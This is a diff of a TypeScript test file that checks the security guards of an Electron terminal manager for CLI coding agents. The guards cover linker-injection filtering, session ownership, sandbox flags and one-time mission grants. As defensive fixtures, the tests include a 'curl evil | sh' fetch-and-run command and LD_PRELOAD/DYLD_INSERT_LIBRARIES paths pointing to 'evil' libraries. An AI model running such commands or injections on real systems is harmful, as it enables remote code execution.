@@ -1,71 +1,148 @@
-import { describe, expect, it, vi } from 'vitest';
-import type { WebContents } from 'electron';
+import fs from "node:fs";
+import { describe, expect, it, vi } from "vitest";
+import type { WebContents } from "electron";
 import {
   agentEnv,
+  bindOwnedAgentSessionMission,
+  consumeMissionOrchestratorGrant,
+  getOwnedAgentSessionInfo,
   getSessionState,
   killSession,
   setPtyHost,
+  setSessionDictationHook,
   spawnAgentSession,
   spawnSession,
   writeSession,
-} from './pty-manager';
-import type { PtyHost, PtyProcHandle, PtySpawnSpec } from './pty-host-core';
-import type { CliPtyAdapter } from '../../shared/adapter-types';
+} from "./pty-manager";
+import type { PtyHost, PtyProcHandle, PtySpawnSpec } from "./pty-host-core";
+import type { CliPtyAdapter } from "../../shared/adapter-types";
+import type { BoundSpawnAuthority } from "../orch/spawn-authority";
+
+function trustedSpawn(
+  cwd = fs.realpathSync(process.cwd()),
+): BoundSpawnAuthority {
+  return {
+    source: "direct-user",
+    context: null,
+    cwd,
+    scope: {
+      version: 1,
+      installationId: "installation-test",
+      projectId: "project-test",
+      checkoutId: "checkout-test",
+      rootRealPath: cwd,
+      identitySource: "provisional",
+    },
+  };
+}
+
+function missionGrant(
+  cwd = fs.realpathSync(process.cwd()),
+): BoundSpawnAuthority {
+  const base = trustedSpawn(cwd);
+  return {
+    ...base,
+    source: "legacy-squad",
+    context: {
+      squadId: "review-squad",
+      agentName: "Maestro",
+      role: "orchestrator",
+      allowedTools: ["nexus_pane_spawn"],
+      allowedSkills: ["review"],
+    },
+  };
+}
+
+function revisionBoundWorker(
+  cwd = fs.realpathSync(process.cwd()),
+): BoundSpawnAuthority {
+  const base = trustedSpawn(cwd);
+  return {
+    ...base,
+    source: "pending",
+    coordinationScope: base.scope,
+    context: {
+      missionId: "mission-worker",
+      contextRevision: "context-revision-worker",
+      role: "worker",
+      allowedTools: [],
+      allowedSkills: null,
+      scope: base.scope,
+      executionScope: base.scope,
+    },
+  };
+}
 
 // A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
 // `env` block matters here; the rest satisfies the type.
 function makeAdapter(
-  env: CliPtyAdapter['env'],
-  spawnPatch: Partial<CliPtyAdapter['spawn']> = {},
+  env: CliPtyAdapter["env"],
+  spawnPatch: Partial<CliPtyAdapter["spawn"]> = {},
 ): CliPtyAdapter {
   return {
-    kind: 'cli-pty',
-    id: 'test-cli',
-    label: 'Test CLI',
-    version: '1.0.0',
-    icon: '🤖',
-    bin: 'test-cli',
-    detect: 'test-cli --version',
-    install: { method: 'npm', command: 'npm install -g test-cli' },
-    auth: { method: 'none' },
+    kind: "cli-pty",
+    id: "test-cli",
+    label: "Test CLI",
+    version: "1.0.0",
+    icon: "🤖",
+    bin: "test-cli",
+    detect: "test-cli --version",
+    install: { method: "npm", command: "npm install -g test-cli" },
+    auth: { method: "none" },
     spawn: {
-      interactive: ['test-cli'],
-      headless: ['test-cli', '--prompt', '{{PROMPT}}'],
+      interactive: ["test-cli"],
+      headless: ["test-cli", "--prompt", "{{PROMPT}}"],
       ptyRequired: true,
       resumeArgs: [],
       extraArgs: [],
       ...spawnPatch,
     },
     env,
-    models: { flag: '--model', list: ['default'], default: 'default' },
-    promptInjection: { method: 'arg', trailingNewline: true, bracketedPaste: false },
+    models: { flag: "--model", list: ["default"], default: "default" },
+    promptInjection: {
+      method: "arg",
+      trailingNewline: true,
+      bracketedPaste: false,
+    },
     stateParsing: {
-      idle: { type: 'timeout', ms: 500 },
+      idle: { type: "timeout", ms: 500 },
       shellIntegration: false,
       exitCodes: {},
     },
-    quirks: { altScreen: false, requiresNoAutoUpdate: false, mcpAutoload: false },
-    control: {},
+    quirks: {
+      altScreen: false,
+      requiresNoAutoUpdate: false,
+      mcpAutoload: false,
+      nexusMcp: "none",
+    },
+    control: {
+      permission: {
+        safe: ["--sandbox", "read-only"],
+        yolo: [],
+        modes: {},
+        default: "",
+      },
+    },
   } as CliPtyAdapter;
 }
 
-describe('agentEnv linker-injection guard (plugin trust boundary)', () => {
-  it('drops DYLD_ keys from env.static', () => {
+describe("agentEnv linker-injection guard (plugin trust boundary)", () => {
+  it("drops DYLD_ keys from env.static", () => {
     const env = agentEnv(
       makeAdapter({
-        static: { DYLD_INSERT_LIBRARIES: '/tmp/evil.dylib', SAFE_VAR: 'ok' },
+        static: { DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib", SAFE_VAR: "ok" },
         passthrough: [],
         ephemeralHome: false,
       }),
     );
     expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
-    expect(env.SAFE_VAR).toBe('ok');
+    expect(env.SAFE_VAR).toBe("ok");
   });
 
-  it('drops LD_ keys from env.static', () => {
+  it("drops LD_ keys from env.static", () => {
     const env = agentEnv(
       makeAdapter({
-        static: { LD_PRELOAD: '/tmp/evil.so', LD_LIBRARY_PATH: '/tmp' },
+        static: { LD_PRELOAD: "/tmp/evil.so", LD_LIBRARY_PATH: "/tmp" },
         passthrough: [],
         ephemeralHome: false,
       }),
@@ -74,14 +151,14 @@ describe('agentEnv linker-injection guard (plugin trust boundary)', () => {
     expect(env.LD_LIBRARY_PATH).toBeUndefined();
   });
 
-  it('drops DYLD_/LD_ keys from env.passthrough even if present in process.env', () => {
-    process.env.DYLD_TEST_INJECT = 'x';
-    process.env.LD_TEST_INJECT = 'y';
+  it("drops DYLD_/LD_ keys from env.passthrough even if present in process.env", () => {
+    process.env.DYLD_TEST_INJECT = "x";
+    process.env.LD_TEST_INJECT = "y";
     try {
       const env = agentEnv(
         makeAdapter({
           static: {},
-          passthrough: ['DYLD_TEST_INJECT', 'LD_TEST_INJECT'],
+          passthrough: ["DYLD_TEST_INJECT", "LD_TEST_INJECT"],
           ephemeralHome: false,
         }),
       );
@@ -93,18 +170,18 @@ describe('agentEnv linker-injection guard (plugin trust boundary)', () => {
     }
   });
 
-  it('keeps ordinary static and passthrough vars', () => {
-    process.env.NEXUS_TEST_TOKEN = 'secret';
+  it("keeps ordinary static and passthrough vars", () => {
+    process.env.NEXUS_TEST_TOKEN = "secret";
     try {
       const env = agentEnv(
         makeAdapter({
-          static: { FOO: 'bar' },
-          passthrough: ['NEXUS_TEST_TOKEN'],
+          static: { FOO: "bar" },
+          passthrough: ["NEXUS_TEST_TOKEN"],
           ephemeralHome: false,
         }),
       );
-      expect(env.FOO).toBe('bar');
-      expect(env.NEXUS_TEST_TOKEN).toBe('secret');
+      expect(env.FOO).toBe("bar");
+      expect(env.NEXUS_TEST_TOKEN).toBe("secret");
     } finally {
       delete process.env.NEXUS_TEST_TOKEN;
     }
@@ -146,23 +223,28 @@ function fakeHost(): {
   };
 }
 
-describe('PTY session ownership (renderer capability boundary)', () => {
-  it('only the owning WebContents can write to / kill a session', () => {
+describe("PTY session ownership (renderer capability boundary)", () => {
+  it("only the owning WebContents can write to / kill a session", () => {
     const h = fakeHost();
     setPtyHost(h.host);
     const owner = fakeWc();
     const attacker = fakeWc();
 
-    const { sessionId } = spawnSession(owner, { kind: 'shell', cols: 80, rows: 24 });
+    const trusted = trustedSpawn();
+    const { sessionId } = spawnSession(
+      owner,
+      { kind: "shell", cols: 80, rows: 24 },
+      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
+    );
     const proc = h.procFor(sessionId);
 
     // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
-    writeSession(attacker, sessionId, 'curl evil | sh\n');
+    writeSession(attacker, sessionId, "curl evil | sh\n");
     expect(proc.write).not.toHaveBeenCalled();
 
     // The owner writes normally.
-    writeSession(owner, sessionId, 'ls\n');
-    expect(proc.write).toHaveBeenCalledWith('ls\n');
+    writeSession(owner, sessionId, "ls\n");
+    expect(proc.write).toHaveBeenCalledWith("ls\n");
 
     // A foreign kill is a no-op; the session stays live.
     killSession(attacker, sessionId);
@@ -176,29 +258,108 @@ describe('PTY session ownership (renderer capability boundary)', () => {
   });
 });
 
-describe('cli-agent spawn argv hardening', () => {
-  it('appends adapter-declared extra args after user overrides', () => {
+describe("cli-agent spawn argv hardening", () => {
+  it("keeps direct panes read-only and grants native writes only to revision-bound workers", () => {
+    const h = fakeHost();
+    setPtyHost(h.host);
+    const base = makeAdapter({
+      static: {},
+      passthrough: [],
+      ephemeralHome: false,
+    });
+    const codex: CliPtyAdapter = {
+      ...base,
+      id: "codex",
+      control: {
+        permission: {
+          safe: ["--sandbox", "workspace-write", "--ask-for-approval", "on-request"],
+          yolo: ["--dangerously-bypass-approvals-and-sandbox"],
+          modes: {},
+          default: "",
+        },
+      },
+    };
+
+    const direct = spawnAgentSession(
+      fakeWc(),
+      { kind: "cli-agent", cols: 80, rows: 24 },
+      codex,
+      {},
+      trustedSpawn(),
+    );
+    const worker = spawnAgentSession(
+      fakeWc(),
+      { kind: "cli-agent", cols: 80, rows: 24 },
+      codex,
+      {},
+      revisionBoundWorker(),
+    );
+
+    expect(h.specFor(direct.sessionId).args).toEqual(expect.arrayContaining([
+      "--sandbox",
+      "read-only",
+      "--ask-for-approval",
+      "never",
+    ]));
+    expect(h.specFor(worker.sessionId).args).toEqual(expect.arrayContaining([
+      "--sandbox",
+      "workspace-write",
+    ]));
+    expect(h.specFor(worker.sessionId).args).not.toContain("read-only");
+  });
+
+  it("reports every scoped agent session even when the provider chooses its id", () => {
+    const h = fakeHost();
+    setPtyHost(h.host);
+    const hook = vi.fn();
+    setSessionDictationHook(hook);
+    const owner = fakeWc();
+    const authority = trustedSpawn();
+    const { sessionId } = spawnAgentSession(
+      owner,
+      { kind: "cli-agent", cols: 80, rows: 24 },
+      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
+      {},
+      authority,
+    );
+    expect(hook).toHaveBeenCalledWith({
+      providerSessionId: null,
+      ptySessionId: sessionId,
+      adapterId: "test-cli",
+      cwd: authority.cwd,
+    });
+    setSessionDictationHook(null);
+    killSession(owner, sessionId);
+  });
+
+  it("appends adapter-declared extra args after user overrides", () => {
     const h = fakeHost();
     setPtyHost(h.host);
 
     const adapter = makeAdapter(
       { static: {}, passthrough: [], ephemeralHome: false },
-      { extraArgs: ['--disallowedTools', 'Task'] },
+      { extraArgs: ["--disallowedTools", "Task"] },
     );
 
     const { sessionId } = spawnAgentSession(
       fakeWc(),
-      { kind: 'cli-agent', cols: 80, rows: 24 },
+      { kind: "cli-agent", cols: 80, rows: 24 },
       adapter,
-      { extraArgs: ['--user-flag'] },
+      { extraArgs: ["--user-flag"] },
+      trustedSpawn(),
     );
 
     const spec = h.specFor(sessionId);
-    expect(spec.args).toContain('--user-flag');
-    expect(spec.args.slice(-2)).toEqual(['--disallowedTools', 'Task']);
+    expect(spec.args).toContain("--user-flag");
+    expect(spec.args).toEqual(expect.arrayContaining([
+      "--disallowedTools",
+      "Task",
+      "--sandbox",
+      "read-only",
+    ]));
   });
 
-  it('lets Kimi transient-model env choose the API model without an overriding --model', () => {
+  it("lets Kimi transient-model env choose the API model without an overriding --model", () => {
     const h = fakeHost();
     setPtyHost(h.host);
     const base = makeAdapter({
@@ -208,41 +369,42 @@ describe('cli-agent spawn argv hardening', () => {
     });
     const adapter: CliPtyAdapter = {
       ...base,
-      id: 'kimi',
-      bin: 'kimi',
-      spawn: { ...base.spawn, interactive: ['kimi'] },
+      id: "kimi",
+      bin: "kimi",
+      spawn: { ...base.spawn, interactive: ["kimi"] },
       models: {
-        flag: '--model',
-        list: ['kimi-code/kimi-for-coding'],
-        default: 'kimi-code/kimi-for-coding',
+        flag: "--model",
+        list: ["kimi-code/kimi-for-coding"],
+        default: "kimi-code/kimi-for-coding",
       },
     };
 
     const { sessionId } = spawnAgentSession(
       fakeWc(),
       {
-        kind: 'cli-agent',
-        adapterId: 'kimi',
-        model: 'kimi-code/kimi-for-coding',
+        kind: "cli-agent",
+        adapterId: "kimi",
+        model: "kimi-code/kimi-for-coding",
         cols: 80,
         rows: 24,
       },
       adapter,
       {
         keyEnv: {
-          KIMI_MODEL_API_KEY: 'sk-kimi-test',
-          KIMI_MODEL_NAME: 'kimi-for-coding',
+          KIMI_MODEL_API_KEY: "sk-kimi-test",
+          KIMI_MODEL_NAME: "kimi-for-coding",
         },
       },
+      trustedSpawn(),
     );
 
     const spec = h.specFor(sessionId);
-    expect(spec.args).not.toContain('--model');
-    expect(spec.env.KIMI_MODEL_API_KEY).toBe('sk-kimi-test');
-    expect(spec.env.KIMI_MODEL_NAME).toBe('kimi-for-coding');
+    expect(spec.args).not.toContain("--model");
+    expect(spec.env.KIMI_MODEL_API_KEY).toBe("sk-kimi-test");
+    expect(spec.env.KIMI_MODEL_NAME).toBe("kimi-for-coding");
   });
 
-  it('normalizes the legacy Kimi OAuth model alias before adding --model', () => {
+  it("normalizes the legacy Kimi OAuth model alias before adding --model", () => {
     const h = fakeHost();
     setPtyHost(h.host);
     const base = makeAdapter({
@@ -252,35 +414,39 @@ describe('cli-agent spawn argv hardening', () => {
     });
     const adapter: CliPtyAdapter = {
       ...base,
-      id: 'kimi',
-      bin: 'kimi',
-      spawn: { ...base.spawn, interactive: ['kimi'] },
+      id: "kimi",
+      bin: "kimi",
+      spawn: { ...base.spawn, interactive: ["kimi"] },
       models: {
-        flag: '--model',
-        list: ['kimi-code/kimi-for-coding'],
-        default: 'kimi-code/kimi-for-coding',
+        flag: "--model",
+        list: ["kimi-code/kimi-for-coding"],
+        default: "kimi-code/kimi-for-coding",
       },
     };
 
     const { sessionId } = spawnAgentSession(
       fakeWc(),
       {
-        kind: 'cli-agent',
-        adapterId: 'kimi',
-        model: 'kimi-for-coding',
+        kind: "cli-agent",
+        adapterId: "kimi",
+        model: "kimi-for-coding",
         cols: 80,
         rows: 24,
       },
       adapter,
+      {},
+      trustedSpawn(),
     );
 
     expect(h.specFor(sessionId).args).toEqual([
-      '--model',
-      'kimi-code/kimi-for-coding',
+      "--model",
+      "kimi-code/kimi-for-coding",
+      "--sandbox",
+      "read-only",
     ]);
   });
 
-  it('passes only provider-qualified OpenCode model ids', () => {
+  it("passes only provider-qualified OpenCode model ids", () => {
     const h = fakeHost();
     setPtyHost(h.host);
     const base = makeAdapter({
@@ -290,43 +456,168 @@ describe('cli-agent spawn argv hardening', () => {
     });
     const adapter: CliPtyAdapter = {
       ...base,
-      id: 'opencode',
-      bin: 'opencode',
-      spawn: { ...base.spawn, interactive: ['opencode'] },
+      id: "opencode",
+      bin: "opencode",
+      spawn: { ...base.spawn, interactive: ["opencode"] },
       models: {
-        flag: '--model',
-        list: ['opencode/big-pickle'],
-        default: 'opencode/big-pickle',
+        flag: "--model",
+        list: ["opencode/big-pickle"],
+        default: "opencode/big-pickle",
       },
     };
 
     const valid = spawnAgentSession(
       fakeWc(),
       {
-        kind: 'cli-agent',
-        adapterId: 'opencode',
-        model: 'opencode/big-pickle',
+        kind: "cli-agent",
+        adapterId: "opencode",
+        model: "opencode/big-pickle",
         cols: 80,
         rows: 24,
       },
       adapter,
+      {},
+      trustedSpawn(),
     );
     const stale = spawnAgentSession(
       fakeWc(),
       {
-        kind: 'cli-agent',
-        adapterId: 'opencode',
-        model: 'claude-sonnet-5',
+        kind: "cli-agent",
+        adapterId: "opencode",
+        model: "claude-sonnet-5",
         cols: 80,
         rows: 24,
       },
       adapter,
+      {},
+      trustedSpawn(),
     );
 
     expect(h.specFor(valid.sessionId).args).toEqual([
-      '--model',
-      'opencode/big-pickle',
+      "--model",
+      "opencode/big-pickle",
+      "--sandbox",
+      "read-only",
     ]);
-    expect(h.specFor(stale.sessionId).args).toEqual([]);
+    expect(h.specFor(stale.sessionId).args).toEqual([
+      "--sandbox",
+      "read-only",
+    ]);
+  });
+
+  it("requires a trusted main-side binding and never falls back to HOME", () => {
+    const h = fakeHost();
+    setPtyHost(h.host);
+    const adapter = makeAdapter({
+      static: {},
+      passthrough: [],
+      ephemeralHome: false,
+    });
+
+    expect(() =>
+      spawnAgentSession(
+        fakeWc(),
+        { kind: "cli-agent", cols: 80, rows: 24 },
+        adapter,
+        {},
+        undefined as never,
+      ),
+    ).toThrow(/trusted spawn authority/);
+  });
+
+  it("uses the canonical bound cwd even when the renderer request carries another cwd", () => {
+    const h = fakeHost();
+    setPtyHost(h.host);
+    const adapter = makeAdapter({
+      static: {},
+      passthrough: [],
+      ephemeralHome: false,
+    });
+    const trustedCwd = fs.realpathSync(process.cwd());
+
+    const { sessionId } = spawnAgentSession(
+      fakeWc(),
+      {
+        kind: "cli-agent",
+        cwd: "/renderer-controlled/path",
+        cols: 80,
+        rows: 24,
+      },
+      adapter,
+      {},
+      trustedSpawn(trustedCwd),
+    );
+
+    expect(h.specFor(sessionId).cwd).toBe(trustedCwd);
+  });
+
+  it("owns agent metadata in main and consumes mission promotion exactly once", () => {
+    const h = fakeHost();
+    setPtyHost(h.host);
+    const owner = fakeWc();
+    const attacker = fakeWc();
+    const cwd = fs.realpathSync(process.cwd());
+    const baseAdapter = makeAdapter({
+      static: {},
+      passthrough: [],
+      ephemeralHome: false,
+    });
+    const adapter: CliPtyAdapter = {
+      ...baseAdapter,
+      quirks: { ...baseAdapter.quirks, mcpAutoload: true },
+    };
+
+    const { sessionId } = spawnAgentSession(
+      owner,
+      {
+        kind: "cli-agent",
+        paneId: "pane-orchestrator",
+        model: "default",
+        accountId: "account-a",
+        effort: "high",
+        cols: 80,
+        rows: 24,
+      },
+      adapter,
+      {},
+      missionGrant(cwd),
+    );
+
+    expect(getOwnedAgentSessionInfo(attacker, sessionId)).toBeNull();
+    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
+      sessionId,
+      paneId: "pane-orchestrator",
+      adapterId: "test-cli",
+      model: "default",
+      accountId: "account-a",
+      effort: "high",
+      cwd,
+      role: "orchestrator",
+      squadId: "review-squad",
+      source: "legacy-squad",
+    });
+    expect(
+      consumeMissionOrchestratorGrant(attacker, sessionId, "review-squad"),
+    ).toBeNull();
+    expect(
+      consumeMissionOrchestratorGrant(owner, sessionId, "other-squad"),
+    ).toBeNull();
+    expect(
+      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
+    ).toMatchObject({ sessionId, squadId: "review-squad" });
+    expect(
+      consumeMissionOrchestratorGrant(owner, sessionId, "review-squad"),
+    ).toBeNull();
+    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-a")).toBe(
+      true,
+    );
+    expect(getOwnedAgentSessionInfo(owner, sessionId)?.missionId).toBe(
+      "mission-a",
+    );
+    expect(bindOwnedAgentSessionMission(owner, sessionId, "mission-b")).toBe(
+      false,
+    );
+
+    killSession(owner, sessionId);
   });
 });
